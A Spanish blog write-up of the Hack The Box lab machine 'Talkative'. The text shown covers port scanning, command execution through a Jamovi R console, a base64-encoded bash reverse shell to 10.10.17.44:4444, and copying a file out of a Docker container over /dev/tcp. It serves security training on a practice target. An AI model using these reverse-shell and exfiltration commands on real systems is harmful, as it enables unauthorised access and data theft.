<!doctype html><html lang="es"><head><title>Talkative | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Máquina difícil. Esta máquina es un sitio web que expone una aplicación Jamovi donde podemos obtener una reverse shell en un contenedor de Docker. Aquí encontramos algunas credenciales para una aplicación Bolt CMS, y conseguimos acceso como administrador. Desde aquí podemos modificar una plantilla escribiendo código PHP y ganar acceso a otro contenedor. Este tiene conectividad con el puerto 22 de la máquina, por lo que podemos acceder a la máquina usando las credenciales anteriores por SSH. Luego, encontramos otro contenedor que ejecuta MongoDB, que contiene la base de datos de un servidor Rocket.Chat. En este punto, podemos crear una nueva cuenta en Rocket.Chat y asignarnos el rol de administrador modificando la entrada de la base de datos. Después de eso, podemos establecer una nueva integración para obtener RCE en el contenedor que gestiona Rocket.Chat. Finalmente, este contenedor tiene habilitada la capability CAP_DAC_READ_SEARCH, que nos permite leer archivos  de la máquina host como root usando un exploit. Además, el contenedor también es vulnerable a otro exploit para escribir archivos arbitrarios como root en la máquina host"><meta itemprop="description" content="Hack The Box. Linux. Máquina difícil. Esta máquina es un sitio web que expone una aplicación Jamovi donde podemos obtener una reverse shell en un contenedor de Docker. Aquí encontramos algunas credenciales para una aplicación Bolt CMS, y conseguimos acceso como administrador. Desde aquí podemos modificar una plantilla escribiendo código PHP y ganar acceso a otro contenedor. Este tiene conectividad con el puerto 22 de la máquina, por lo que podemos acceder a la máquina usando las credenciales anteriores por SSH. Luego, encontramos otro contenedor que ejecuta MongoDB, que contiene la base de datos de un servidor Rocket.Chat. En este punto, podemos crear una nueva cuenta en Rocket.Chat y asignarnos el rol de administrador modificando la entrada de la base de datos. Después de eso, podemos establecer una nueva integración para obtener RCE en el contenedor que gestiona Rocket.Chat. Finalmente, este contenedor tiene habilitada la capability CAP_DAC_READ_SEARCH, que nos permite leer archivos  de la máquina host como root usando un exploit. Además, el contenedor también es vulnerable a otro exploit para escribir archivos arbitrarios como root en la máquina host"><meta name="twitter:card" content="Hack The Box. Linux. Máquina difícil. Esta máquina es un sitio web que expone una aplicación Jamovi donde podemos obtener una reverse shell en un contenedor de Docker. Aquí encontramos algunas credenciales para una aplicación Bolt CMS, y conseguimos acceso como administrador. Desde aquí podemos modificar una plantilla escribiendo código PHP y ganar acceso a otro contenedor. Este tiene conectividad con el puerto 22 de la máquina, por lo que podemos acceder a la máquina usando las credenciales anteriores por SSH. Luego, encontramos otro contenedor que ejecuta MongoDB, que contiene la base de datos de un servidor Rocket.Chat. En este punto, podemos crear una nueva cuenta en Rocket.Chat y asignarnos el rol de administrador modificando la entrada de la base de datos. Después de eso, podemos establecer una nueva integración para obtener RCE en el contenedor que gestiona Rocket.Chat. Finalmente, este contenedor tiene habilitada la capability CAP_DAC_READ_SEARCH, que nos permite leer archivos  de la máquina host como root usando un exploit. Además, el contenedor también es vulnerable a otro exploit para escribir archivos arbitrarios como root en la máquina host"><meta name="twitter:description" content="Hack The Box. Linux. Máquina difícil. Esta máquina es un sitio web que expone una aplicación Jamovi donde podemos obtener una reverse shell en un contenedor de Docker. Aquí encontramos algunas credenciales para una aplicación Bolt CMS, y conseguimos acceso como administrador. Desde aquí podemos modificar una plantilla escribiendo código PHP y ganar acceso a otro contenedor. Este tiene conectividad con el puerto 22 de la máquina, por lo que podemos acceder a la máquina usando las credenciales anteriores por SSH. Luego, encontramos otro contenedor que ejecuta MongoDB, que contiene la base de datos de un servidor Rocket.Chat. En este punto, podemos crear una nueva cuenta en Rocket.Chat y asignarnos el rol de administrador modificando la entrada de la base de datos. Después de eso, podemos establecer una nueva integración para obtener RCE en el contenedor que gestiona Rocket.Chat. Finalmente, este contenedor tiene habilitada la capability CAP_DAC_READ_SEARCH, que nos permite leer archivos  de la máquina host como root usando un exploit. Además, el contenedor también es vulnerable a otro exploit para escribir archivos arbitrarios como root en la máquina host"><meta property="og:description" content="Hack The Box. Linux. Máquina difícil. Esta máquina es un sitio web que expone una aplicación Jamovi donde podemos obtener una reverse shell en un contenedor de Docker. Aquí encontramos algunas credenciales para una aplicación Bolt CMS, y conseguimos acceso como administrador. Desde aquí podemos modificar una plantilla escribiendo código PHP y ganar acceso a otro contenedor. Este tiene conectividad con el puerto 22 de la máquina, por lo que podemos acceder a la máquina usando las credenciales anteriores por SSH. Luego, encontramos otro contenedor que ejecuta MongoDB, que contiene la base de datos de un servidor Rocket.Chat. En este punto, podemos crear una nueva cuenta en Rocket.Chat y asignarnos el rol de administrador modificando la entrada de la base de datos. Después de eso, podemos establecer una nueva integración para obtener RCE en el contenedor que gestiona Rocket.Chat. Finalmente, este contenedor tiene habilitada la capability CAP_DAC_READ_SEARCH, que nos permite leer archivos  de la máquina host como root usando un exploit. Además, el contenedor también es vulnerable a otro exploit para escribir archivos arbitrarios como root en la máquina host"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/HTB/Talkative/Talkative.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Talkative/Talkative.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Talkative/Talkative.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="Talkative"><meta property="twitter:title" content="Talkative"><meta property="og:title" content="Talkative"><meta property="og:url" content="https://7rocky.github.io/htb/talkative/"><meta itemprop="keywords" content="docker,mongodb,capabilities,port-forwarding,password-reuse,rce,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/talkative/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/talkative/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/talkative/&text=Talkative" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/talkative/&title=Talkative" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Talkative</h1><time class="mt4 f6 dib tracked" datetime="2022-08-27T00:00:00+01:00">27 / 08 / 2022</time><br><p class="mb4 f6 dib tracked">23 minutos de lectura</p></header><div class="htb-image"><img alt="Talkative" src="/images/HTB/Talkative/Talkative.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/docker" title="Docker">Docker</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/mongodb" title="MongoDB">MongoDB</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/capabilities" title="<em>Capabilities</em>"><em>Capabilities</em></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/port-forwarding" title="Reenvío de puertos">Reenvío de puertos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-reuse" title="Reutilización de contraseñas">Reutilización de contraseñas</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecución remota de comandos">Ejecución remota de comandos</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#enumeración-del-contenedor">Enumeración del contenedor</a></li><li><a href="#enumerando-más-servicios">Enumerando más servicios</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#enumeración-de-red">Enumeración de red</a></li><li><a href="#acceso-mediante-ssh">Acceso mediante SSH</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a><ul><li><a href="#enumeración-de-mongodb">Enumeración de MongoDB</a></li></ul></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#accediendo-a-rocketchat-como-administrador">Accediendo a Rocket.Chat como administrador</a></li><li><a href="#explotación-de-_capabilities_">Explotación de <em>capabilities</em></a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Difícil</li><li><strong>Dirección IP</strong>: 10.10.11.155</li><li><strong>Fecha</strong>: 09 / 04 / 2022</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.155 -p 80,3000,8080,8081,8082
Nmap scan report for 10.10.11.155
Host is up (0.069s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Debian)
|_http-title: Did not follow redirect to http://talkative.htb
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: Me5YLwebzMWLdRR8M
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date:
|     Connection: close
|     &lt;!DOCTYPE html&gt;
|     &lt;html&gt;
|     &lt;head&gt;
|     &lt;link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true"&gt;  
|     &lt;meta charset="utf-8" /&gt;
|     &lt;meta http-equiv="content-type" content="text/html; charset=utf-8" /&gt;
|     &lt;meta http-equiv="expires" content="-1" /&gt;
|     &lt;meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt;
|     &lt;meta name="fragment" content="!" /&gt;
|     &lt;meta name="distribution" content="global" /&gt;
|     &lt;meta name="rating" content="general" /&gt;
|     &lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" /&gt;
|     &lt;meta name="mobile-web-app-capable" content="yes" /&gt;
|     &lt;meta name="apple-mobile-web-app-capable" conte&gt;
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: Me5YLwebzMWLdRR8M
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date:
|     Connection: close
|     &lt;!DOCTYPE html&gt;
|     &lt;html&gt;
|     &lt;head&gt;
|     &lt;link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true"&gt;
|     &lt;meta charset="utf-8" /&gt;
|     &lt;meta http-equiv="content-type" content="text/html; charset=utf-8" /&gt;
|     &lt;meta http-equiv="expires" content="-1" /&gt;
|     &lt;meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt;
|     &lt;meta name="fragment" content="!" /&gt;
|     &lt;meta name="distribution" content="global" /&gt;
|     &lt;meta name="rating" content="general" /&gt;
|     &lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" /&gt;
|     &lt;meta name="mobile-web-app-capable" content="yes" /&gt;
|     &lt;meta name="apple-mobile-web-app-capable" conte&gt;
|   Help, NCP:
|_    HTTP/1.1 400 Bad Request
8080/tcp open  http    Tornado httpd 5.0
|_http-title: jamovi
|_http-server-header: TornadoServer/5.0
8081/tcp open  http    Tornado httpd 5.0
|_http-title: 404: Not Found
|_http-server-header: TornadoServer/5.0
8082/tcp open  http    Tornado httpd 5.0
|_http-server-header: TornadoServer/5.0
|_http-title: 404: Not Found
Service Info: Host: 172.17.0.16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 20.78 seconds
</code></pre></div><p>La máquina tiene abiertos los puertos 80, 3000, 8080, 8081 y 8082 (HTTP).</p><h2 id="enumeración">Enumeración</h2><p>Si vamos a <code>http://10.10.11.155</code> se nos redirige a <code>http://talkative.htb</code>. Después de poner el dominio en <code>/etc/hosts</code>, veremos la siguiente página:</p><p><img src="/images/HTB/Talkative/Talkative-1.png" alt="Talkative 1"></p><p>En esta página podemos ver algunos nombres de usuario:</p><p><img src="/images/HTB/Talkative/Talkative-2.png" alt="Talkative 2"></p><p>Vayamos a <code>http://10.10.11.155:3000</code>:</p><p><img src="/images/HTB/Talkative/Talkative-3.png" alt="Talkative 3"></p><p>Es un servidor de Rocket.Chat, pero aún no tenemos credenciales.</p><p>En el puerto 8080 encontramos una aplicación Jamovi:</p><p><img src="/images/HTB/Talkative/Talkative-4.png" alt="Talkative 4"></p><p>Aquí se nos permite ejecutar el código en R. Lo interesante es ejecutar comandos de sistema utilizando una función llamada <code>system</code>:</p><p><img src="/images/HTB/Talkative/Talkative-5.png" alt="Talkative 5"></p><h3 id="enumeración-del-contenedor">Enumeración del contenedor</h3><p>Aunque no vemos la salida esperada (solo el código de error), el comando se ha ejecutado. Por lo tanto, podemos obtener una <em>reverse shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i &gt;& /dev/tcp/10.10.17.44/4444 0&gt;&1'</span> | <span class="code-dark-green">base64</span>  
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
</code></pre></div><p><img src="/images/HTB/Talkative/Talkative-6.png" alt="Talkative 6"></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.155.
Ncat: Connection from 10.10.11.155:38970.
bash: cannot set terminal process group (1): Inappropriate ioctl for device  
bash: no job control in this shell
root@b06821bbda78:/# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@b06821bbda78:/# ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm

root@b06821bbda78:/# export TERM=xterm
root@b06821bbda78:/# export SHELL=bash
root@b06821bbda78:/# stty rows 50 columns 158
</code></pre></div><p>Ahora estamos dentro de un contenedor de Docker:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@b06821bbda78:/# hostname -i
172.18.0.2
root@b06821bbda78:/# ls -la
total 80
drwxr-xr-x   1 root root 4096 Mar  7 23:18 <span class="code-blue">.</span>
drwxr-xr-x   1 root root 4096 Mar  7 23:18 <span class="code-blue">..</span>
-rwxr-xr-x   1 root root    0 Aug 15  2021 <span class="code-green">.dockerenv</span>  
drwxr-xr-x   2 root root 4096 Jul 22  2021 <span class="code-blue">bin</span>
drwxr-xr-x   2 root root 4096 Apr 12  2016 <span class="code-blue">boot</span>
drwxr-xr-x   5 root root  340 Aug 10 11:20 <span class="code-blue">dev</span>
drwxr-xr-x   1 root root 4096 Aug 15  2021 <span class="code-blue">etc</span>
drwxr-xr-x   2 root root 4096 Apr 12  2016 <span class="code-blue">home</span>
drwxr-xr-x   1 root root 4096 Aug 15  2021 <span class="code-blue">lib</span>
drwxr-xr-x   2 root root 4096 Jul 22  2021 <span class="code-blue">lib64</span>
drwxr-xr-x   2 root root 4096 Jul 22  2021 <span class="code-blue">media</span>
drwxr-xr-x   2 root root 4096 Jul 22  2021 <span class="code-blue">mnt</span>
drwxr-xr-x   2 root root 4096 Jul 22  2021 <span class="code-blue">opt</span>
dr-xr-xr-x 488 root root    0 Aug 10 11:20 <span class="code-blue">proc</span>
drwx------   1 root root 4096 Mar  7 23:19 <span class="code-blue">root</span>
drwxr-xr-x   1 root root 4096 Aug 15  2021 <span class="code-blue">run</span>
drwxr-xr-x   1 root root 4096 Aug 15  2021 <span class="code-blue">sbin</span>
drwxr-xr-x   2 root root 4096 Jul 22  2021 <span class="code-blue">srv</span>
dr-xr-xr-x  13 root root    0 Aug 10 11:20 <span class="code-blue">sys</span>
drwxrwxrwt   1 root root 4096 Aug 10 11:41 <span class="code-blue code-bg-green">tmp</span>
drwxr-xr-x   1 root root 4096 Jul 22  2021 <span class="code-blue">usr</span>
drwxr-xr-x   1 root root 4096 Jul 22  2021 <span class="code-blue">var
</code></pre></div><p>En <code>/root</code> encontramos algunos archivos interesantes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@b06821bbda78:/# ls -la /root
total 28
drwx------ 1 root root 4096 Mar  7 23:19 <span class="code-blue">.</span>
drwxr-xr-x 1 root root 4096 Aug 10 11:46 <span class="code-blue">..</span>
lrwxrwxrwx 1 root root    9 Mar  7 23:19 <span class="code-cyan">.bash_history</span> -&gt; /dev/null
-rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x 3 root root 4096 Aug 10 11:41 <span class="code-blue">.jamovi</span>
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxrwxrwx 2 root root 4096 Aug 15  2021 <span class="code-blue code-bg-green">Documents</span>
-rw-r--r-- 1 root root 2192 Aug 15  2021 bolt-administration.omv
root@b06821bbda78:/# file /root/bolt-administration.omv
/root/bolt-administration.omv: Zip archive data, at least v2.0 to extract  
root@b06821bbda78:/# ls -la /root/.jamovi/
total 16
drwxr-xr-x 3 root root 4096 Feb  8 19:24 <span class="code-blue">.</span>
drwx------ 1 root root 4096 Mar  7  2022 <span class="code-blue">..</span>
-rw-r--r-- 1 root root    0 Feb  8 19:18 41337.port
drwxr-xr-x 3 root root 4096 Aug 15  2021 <span class="code-blue">modules</span>
-rw-r--r-- 1 root root    2 Feb  8 19:24 settings.json
root@b06821bbda78:/# ls -la /root/Documents/
total 8
drwxrwxrwx 2 root root 4096 Aug 15  2021 <span class="code-blue code-bg-green">.</span>
drwx------ 1 root root 4096 Mar  7  2022 <span class="code-blue">..</span>
</code></pre></div><p>Vamos a transferirmos <code>bolt-administration.omv</code> a nuestra máquina, que es un archivo ZIP (el resto de los archivos no son interesantes debido a su tamaño):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@b06821bbda78:/# cat /root/bolt-administration.omv &gt; /dev/tcp/10.10.17.44/4444  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444 &gt; bolt-administration.omv.zip
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.155.
Ncat: Connection from 10.10.11.155:39474.

<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">bolt-administration.omv.zip</span>
bolt-administration.omv: Zip archive data, at least v2.0 to extract, compression method=deflate  

<span class="code-cyan">$</span> <span class="code-dark-green">unzip</span> -l <span class="mtku">bolt-administration.omv.zip</span>
Archive:  bolt-administration.omv.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      106  08-14-2021 23:16   META-INF/MANIFEST.MF
      106  08-14-2021 23:16   meta
     2505  08-14-2021 23:16   index.html
